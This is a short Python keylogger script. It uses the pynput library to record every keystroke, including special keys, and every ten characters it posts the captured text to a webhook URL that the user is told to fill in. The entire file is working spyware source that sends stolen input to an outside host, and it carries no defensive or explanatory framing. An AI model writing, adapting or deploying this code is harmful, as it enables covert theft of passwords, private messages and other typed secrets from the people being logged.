import requests
from pynput.keyboard import Listener, Key

WEBHOOK_URL = "<put your webhook url here>"

log = ""

def send_log():
    global log
    if log:
        requests.post(WEBHOOK_URL, json={"content": log})
        log = ""

def on_press(key):
    global log

    try:
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "[ENTER]\n"
        elif key == Key.backspace:
            log = log[:-1]
        else:
            log += key.char
    except AttributeError:
        log += f"[{key.name}]"

    if len(log) >= 10:
        send_log()

def start_logger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_logger()
